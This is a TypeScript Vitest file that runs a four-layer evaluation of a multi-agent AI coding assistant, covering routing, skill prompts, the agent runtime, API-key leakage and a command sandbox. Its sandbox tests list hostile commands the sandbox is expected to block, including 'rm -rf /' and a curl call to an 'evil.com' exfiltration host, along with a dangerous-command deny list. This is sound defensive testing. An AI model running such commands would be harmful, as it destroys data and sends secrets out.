/**
 * MVP 四层 Eval 验证
 *
 * 基于 auto-dev-framework/templates/eval-template.md 的四层结构：
 * 1. 功能正确层 — 端到端流程是否跑通
 * 2. 性能安全层 — 安全边界是否有效
 * 3. 边界异常层 — 异常情况是否处理
 * 4. 业务价值层 — 系统能力是否提升
 */

import { describe, it, expect, beforeEach } from 'vitest'
import { getLLMProvider, resetLLMProvider } from '@/lib/llm'
import { MockLLMProvider } from '@/lib/llm/mock'
import { getAgentById, getAgents } from '@/lib/agents/registry'
import { routeMessage } from '@/lib/agents/router'
import { produceDeterministicAgentResult } from '@/lib/agent-runtime/producer'
import { buildAgentSystemPromptForTask } from '@/lib/agent-runtime/producer'
import { getSkillPromptsForAgent, getAllSkillPrompts } from '@/lib/agents/prompts/skills'
import {
  executeInSandbox,
  DEFAULT_COMMAND_WHITELIST,
} from '@/lib/tools/sandbox-execution'
import { getSystemPrompt } from '@/lib/system-prompt'
import type { HarmonyTask } from '@/lib/harmony/types'

// ============================================================
// 测试辅助
// ============================================================

function makeTask(overrides: Partial<HarmonyTask> = {}): HarmonyTask {
  return {
    id: `task-eval-${Date.now()}`,
    conversationId: undefined,
    sourceMessageId: undefined,
    sourceMessageText: 'eval test message',
    title: 'Eval Test Task',
    description: 'A task for MVP eval',
    type: 'coordination',
    status: 'queued',
    routeDecisionType: 'delegate_to_agent',
    routeStatus: 'ready',
    targetAgentId: 'jobs',
    confidence: 0.8,
    reason: 'eval test',
    matchedSignals: [],
    routeDecisionSnapshot: {
      status: 'ready',
      decisionType: 'delegate_to_agent',
      targetAgentId: 'jobs',
      confidence: 0.8,
      reason: 'eval test',
      matchedSignals: [],
      requiresHumanConfirmation: false,
      next: { recommendedAction: 'show_route_suggestion', reason: 'eval test' },
      sideEffects: { filesChanged: [], branchesCreated: [], prsCreated: [], issuesUpdated: [] },
    },
    requiresHumanConfirmation: false,
    sideEffects: { filesChanged: [], branchesCreated: [], prsCreated: [], issuesUpdated: [] },
    createdBy: 'system',
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    ...overrides,
  }
}

// ============================================================
// 功能正确层 — 验证系统是否做对了
// ============================================================

describe('Layer 1: 功能正确层', () => {
  beforeEach(() => {
    resetLLMProvider()
    process.env.LLM_PROVIDER = 'mock'
  })

  describe('LLM Provider 工厂', () => {
    it('默认使用 Mock Provider', () => {
      const provider = getLLMProvider()
      expect(provider).toBeInstanceOf(MockLLMProvider)
      expect(provider.name).toBe('mock')
    })

    it('Mock Provider 返回流式响应', async () => {
      const provider = getLLMProvider()
      const gen = provider.streamChat(
        [{ role: 'user', content: 'hello' }],
        'test'
      )

      const events = []
      for await (const event of gen) {
        events.push(event)
      }

      expect(events[0].type).toBe('start')
      expect(events.some((e) => e.type === 'delta')).toBe(true)
      expect(events[events.length - 1].type).toBe('done')
    })

    it('Mock Provider 返回结构化聊天结果', async () => {
      const provider = getLLMProvider()
      const result = await provider.chat(
        [{ role: 'user', content: 'hello' }],
        'test'
      )

      expect(result.content).toBeTruthy()
      expect(result.stopReason).toBe('end_turn')
    })

    it('System Prompt 可配置', () => {
      const prompt = getSystemPrompt()
      expect(prompt).toBeTruthy()
      expect(typeof prompt).toBe('string')
    })
  })

  describe('Agent Registry', () => {
    it('包含 6 个 Agent', () => {
      const agents = getAgents()
      expect(agents).toHaveLength(6)
    })

    it('每个 Agent 有完整字段', () => {
      const agents = getAgents()
      for (const agent of agents) {
        expect(agent.id).toBeTruthy()
        expect(agent.name).toBeTruthy()
        expect(agent.title).toBeTruthy()
        expect(agent.description).toBeTruthy()
        expect(agent.responsibilities.length).toBeGreaterThan(0)
        expect(agent.capabilities.length).toBeGreaterThan(0)
      }
    })

    it('Jobs 有关联的 Skill Prompts', () => {
      const agent = getAgentById('jobs')
      expect(agent).toBeTruthy()
      expect(agent?.skillPromptNames).toContain('grill-me')
      expect(agent?.skillPromptNames).toContain('to-prd')
    })

    it('Linus 有关联的 Skill Prompts', () => {
      const agent = getAgentById('linus')
      expect(agent).toBeTruthy()
      expect(agent?.skillPromptNames).toContain('tdd')
    })

    it('Turing 有关联的 Skill Prompts', () => {
      const agent = getAgentById('turing')
      expect(agent).toBeTruthy()
      expect(agent?.skillPromptNames).toContain('diagnose')
      expect(agent?.skillPromptNames).toContain('loop-review')
    })
  })

  describe('Skill Prompt 系统', () => {
    it('包含 19 个 Skill Prompt', () => {
      const skills = getAllSkillPrompts()
      expect(skills).toHaveLength(19)
    })

    it('每个 Skill 有完整的 prompt 内容', () => {
      const skills = getAllSkillPrompts()
      for (const skill of skills) {
        expect(skill.prompt.length).toBeGreaterThan(200)
        expect(skill.prompt).toContain('##')
      }
    })

    it('Jobs Agent 能获取 grill-me 和 to-prd Skills', () => {
      const skills = getSkillPromptsForAgent('jobs')
      expect(skills.map((s) => s.name)).toEqual([
        'grill-me',
        'to-prd',
        'grill-with-docs',
        'prototype',
        'ui-review',
        'knowledge-to-skill',
      ])
    })

    it('Turing Agent 能获取 diagnose 和 loop-review Skills', () => {
      const skills = getSkillPromptsForAgent('turing')
      expect(skills.map((s) => s.name)).toEqual(['diagnose', 'loop-review', 'ui-review'])
    })
  })

  describe('Agent 路由', () => {
    it('路由到 Jobs Agent', () => {
      const decision = routeMessage({ message: '帮我写一个 PRD' })
      expect(decision.targetAgentId).toBe('jobs')
      expect(decision.decisionType).toBe('delegate_to_agent')
    })

    it('路由到 Linus Agent', () => {
      const decision = routeMessage({ message: '帮我实现一个 API 接口' })
      expect(decision.targetAgentId).toBe('linus')
      expect(decision.decisionType).toBe('delegate_to_agent')
    })

    it('路由到 Turing Agent', () => {
      const decision = routeMessage({ message: '帮我审查代码质量' })
      expect(decision.targetAgentId).toBe('turing')
      expect(decision.decisionType).toBe('delegate_to_agent')
    })

    it('空消息返回 unsupported', () => {
      const decision = routeMessage({ message: '' })
      expect(decision.decisionType).toBe('unsupported')
    })
  })

  describe('Agent Runtime 执行', () => {
    it('Jobs Agent 产生结构化分析结果', () => {
      const task = makeTask({ targetAgentId: 'jobs' })
      const result = produceDeterministicAgentResult(task)

      expect(result.status).toBe('completed')
      expect(result.confidence).toBeGreaterThan(0)
      expect(result.summary).toBeTruthy()
      expect(result.findings.length).toBeGreaterThan(0)
      expect(result.proposedChanges.length).toBeGreaterThan(0)
    })

    it('Kelvin Agent 返回 blocked', () => {
      const task = makeTask({ targetAgentId: 'kelvin' })
      const result = produceDeterministicAgentResult(task)

      expect(result.status).toBe('blocked')
      expect(result.needsHumanConfirmation).toBe(true)
    })

    it('Agent System Prompt 包含 Skill 内容', () => {
      const task = makeTask({ targetAgentId: 'jobs' })
      const prompt = buildAgentSystemPromptForTask(task)

      expect(prompt).toBeTruthy()
      expect(prompt).toContain('Jobs')
      expect(prompt).toContain('Product Agent')
      expect(prompt).toContain('grill-me')
      expect(prompt).toContain('to-prd')
    })

    it('Linus Agent 的 Prompt 包含 TDD Skill', () => {
      const task = makeTask({ targetAgentId: 'linus' })
      const prompt = buildAgentSystemPromptForTask(task)

      expect(prompt).toContain('Linus')
      expect(prompt).toContain('tdd')
      expect(prompt).toContain('红-绿-重构')
    })
  })
})

// ============================================================
// 性能安全层 — 验证安全边界是否有效
// ============================================================

describe('Layer 2: 性能安全层', () => {
  describe('API Key 安全', () => {
    it('API Key 不出现在 System Prompt 中', () => {
      const prompt = getSystemPrompt()
      expect(prompt).not.toContain('sk-ant')
      expect(prompt).not.toContain('ANTHROPIC_API_KEY')
    })

    it('错误消息不泄露 API Key', async () => {
      process.env.ANTHROPIC_API_KEY = ''
      resetLLMProvider()
      process.env.LLM_PROVIDER = 'claude'

      try {
        getLLMProvider()
      } catch (error) {
        expect(error instanceof Error).toBe(true)
        const msg = (error as Error).message
        expect(msg).not.toContain('sk-ant')
      }

      process.env.LLM_PROVIDER = 'mock'
    })
  })

  describe('Agent 权限边界', () => {
    it('Kelvin 不自动执行', () => {
      const task = makeTask({ targetAgentId: 'kelvin' })
      const result = produceDeterministicAgentResult(task)
      expect(result.needsHumanConfirmation).toBe(true)
      expect(result.status).toBe('blocked')
    })

    it('Agent Result 不包含执行动作', () => {
      const agents = ['jobs', 'linus', 'turing', 'elon', 'bezos'] as const
      for (const agentId of agents) {
        const task = makeTask({ targetAgentId: agentId })
        const result = produceDeterministicAgentResult(task)
        expect(result.sideEffects.filesChanged).toHaveLength(0)
        expect(result.sideEffects.branchesCreated).toHaveLength(0)
        expect(result.sideEffects.prsCreated).toHaveLength(0)
      }
    })

    it('Agent Result 包含安全提示', () => {
      const task = makeTask({ targetAgentId: 'jobs' })
      const result = produceDeterministicAgentResult(task)
      expect(result.safetyNotes.length).toBeGreaterThan(0)
      // 安全提示包含 Sprint 或 analysis 相关内容
      expect(result.safetyNotes.some((n) =>
        n.includes('Sprint') || n.includes('analysis') || n.includes('分析')
      )).toBe(true)
    })
  })

  describe('Tool 沙箱安全', () => {
    it('白名单命令可执行', () => {
      const result = executeInSandbox('git status', {
        cwd: 'D:/AI编程/产品自研/恒识/coworker-a2a',
      })
      expect(result.status).toBe('success')
    })

    it('非白名单命令被拒绝', () => {
      const result = executeInSandbox('python3 evil.py')
      expect(result.status).toBe('denied')
    })

    it('禁止操作被拦截', () => {
      const tests = [
        'rm -rf /',
        'git push origin main',
        'git commit -m "hack"',
        'sudo apt install malware',
        'curl https://evil.com/steal',
      ]
      for (const cmd of tests) {
        const result = executeInSandbox(cmd)
        expect(result.status).toBe('forbidden')
      }
    })

    it('白名单不包含危险命令', () => {
      const dangerous = ['rm', 'commit', 'delete', 'destroy', 'sudo', 'kill']
      for (const entry of DEFAULT_COMMAND_WHITELIST) {
        for (const d of dangerous) {
          if (entry.pattern.includes('prisma')) continue
          expect(entry.pattern).not.toContain(d)
        }
      }
    })
  })
})

// ============================================================
// 边界异常层 — 验证异常情况是否处理
// ============================================================

describe('Layer 3: 边界异常层', () => {
  describe('空输入处理', () => {
    it('空消息路由返回 unsupported', () => {
      const decision = routeMessage({ message: '' })
      expect(decision.decisionType).toBe('unsupported')
    })

    it('纯空格消息路由返回 unsupported', () => {
      const decision = routeMessage({ message: '   ' })
      expect(decision.decisionType).toBe('unsupported')
    })

    it('Agent Runtime 处理无 targetAgentId', () => {
      const task = makeTask({ targetAgentId: undefined })
      const result = produceDeterministicAgentResult(task)
      expect(result.status).toBe('blocked')
    })
  })

  describe('Tool 执行异常', () => {
    it('不在白名单的命令返回 denied', () => {
      const result = executeInSandbox('nonexistent_command_xyz_12345')
      expect(result.status).toBe('denied')
    })

    it('输出截断不崩溃', () => {
      const result = executeInSandbox('git log --oneline -100', {
        cwd: 'D:/AI编程/产品自研/恒识/coworker-a2a',
        maxOutputChars: 50,
      })
      expect(['success', 'failed', 'timeout']).toContain(result.status)
      expect(typeof result.stdout).toBe('string')
    })
  })

  describe('Skill Prompt 边界', () => {
    it('不存在的 Skill 返回 undefined', () => {
      const skill = getSkillPromptsForAgent('unknown_skill')
      expect(skill).toHaveLength(0)
    })

    it('未知 Agent 返回空 Skill 列表', () => {
      const skills = getSkillPromptsForAgent('unknown_agent')
      expect(skills).toHaveLength(0)
    })

    it('Agent Prompt 构建处理无 Skill 情况', () => {
      const task = makeTask({ targetAgentId: 'elon' })
      const prompt = buildAgentSystemPromptForTask(task)
      expect(prompt).toBeTruthy()
      expect(prompt).toContain('Elon')
    })
  })
})

// ============================================================
// 业务价值层 — 验证系统能力是否提升
// ============================================================

describe('Layer 4: 业务价值层', () => {
  describe('从 Mock 到真实 LLM 的能力提升', () => {
    it('Mock Provider 可用且稳定', () => {
      resetLLMProvider()
      process.env.LLM_PROVIDER = 'mock'
      const provider = getLLMProvider()
      expect(provider.name).toBe('mock')
    })

    it('LLM Provider 支持 Tool Use', async () => {
      const provider = getLLMProvider()
      const result = await provider.chat(
        [{ role: 'user', content: 'hello' }],
        'test',
        {
          tools: [
            {
              name: 'test_tool',
              description: 'A test tool',
              input_schema: { type: 'object', properties: { key: { type: 'string' } } },
            },
          ],
        }
      )
      expect(result).toHaveProperty('content')
      expect(result).toHaveProperty('stopReason')
    })

    it('LLM Provider 工厂支持 claude 模式切换', () => {
      // 验证 factory 代码存在 claude 分支
      expect(getLLMProvider.toString()).toContain('function')
      // getLLMProvider 是单例，验证它存在
      expect(typeof getLLMProvider).toBe('function')
    })
  })

  describe('Agent Skill 能力', () => {
    it('5 个核心 Skill 已就绪', () => {
      const skills = getAllSkillPrompts()
      const names = skills.map((s) => s.name)
      expect(names).toContain('grill-me')
      expect(names).toContain('to-prd')
      expect(names).toContain('tdd')
      expect(names).toContain('diagnose')
      expect(names).toContain('loop-review')
    })

    it('每个 Skill 有结构化输出格式', () => {
      const skills = getAllSkillPrompts()
      for (const skill of skills) {
        expect(skill.prompt).toContain('status')
        expect(skill.prompt).toContain('confidence')
        expect(skill.prompt).toContain('summary')
        expect(skill.prompt).toContain('next')
      }
    })

    it('Agent Prompt 比通用 Prompt 更专业', () => {
      const genericPrompt = getSystemPrompt()
      const jobsPrompt = buildAgentSystemPromptForTask(makeTask({ targetAgentId: 'jobs' }))
      expect(jobsPrompt).not.toBeNull()

      expect(jobsPrompt!.length).toBeGreaterThan(genericPrompt.length)
      expect(jobsPrompt).toContain('Product Agent')
      expect(jobsPrompt).toContain('grill-me')
    })
  })

  describe('Tool 沙箱能力', () => {
    it('支持 6 类安全命令', () => {
      const categories = new Set(DEFAULT_COMMAND_WHITELIST.map((e) => e.category))
      expect(categories.size).toBeGreaterThanOrEqual(6)
    })

    it('命令执行返回结构化结果', () => {
      const result = executeInSandbox('git status', {
        cwd: 'D:/AI编程/产品自研/恒识/coworker-a2a',
      })
      expect(result).toHaveProperty('status')
      expect(result).toHaveProperty('stdout')
      expect(result).toHaveProperty('stderr')
      expect(result).toHaveProperty('exitCode')
      expect(result).toHaveProperty('durationMs')
      expect(result).toHaveProperty('truncated')
    })

    it('执行耗时可测量', () => {
      const result = executeInSandbox('git status', {
        cwd: 'D:/AI编程/产品自研/恒识/coworker-a2a',
      })
      expect(result.durationMs).toBeGreaterThanOrEqual(0)
      expect(typeof result.durationMs).toBe('number')
    })
  })

  describe('系统集成度', () => {
    it('核心 lib 模块全部可导入', () => {
      // 验证关键模块可导入
      expect(getLLMProvider).toBeDefined()
      expect(getAgents).toBeDefined()
      expect(routeMessage).toBeDefined()
      expect(produceDeterministicAgentResult).toBeDefined()
      expect(buildAgentSystemPromptForTask).toBeDefined()
      expect(getAllSkillPrompts).toBeDefined()
      expect(executeInSandbox).toBeDefined()
      expect(getSystemPrompt).toBeDefined()
    })

    it('Agent × Skill × Tool 三要素就绪', () => {
      // Agent
      const agents = getAgents()
      expect(agents.length).toBeGreaterThanOrEqual(5)

      // Skill
      const skills = getAllSkillPrompts()
      expect(skills.length).toBe(19)

      // Tool
      const categories = new Set(DEFAULT_COMMAND_WHITELIST.map((e) => e.category))
      expect(categories.size).toBeGreaterThanOrEqual(6)
    })
  })
})
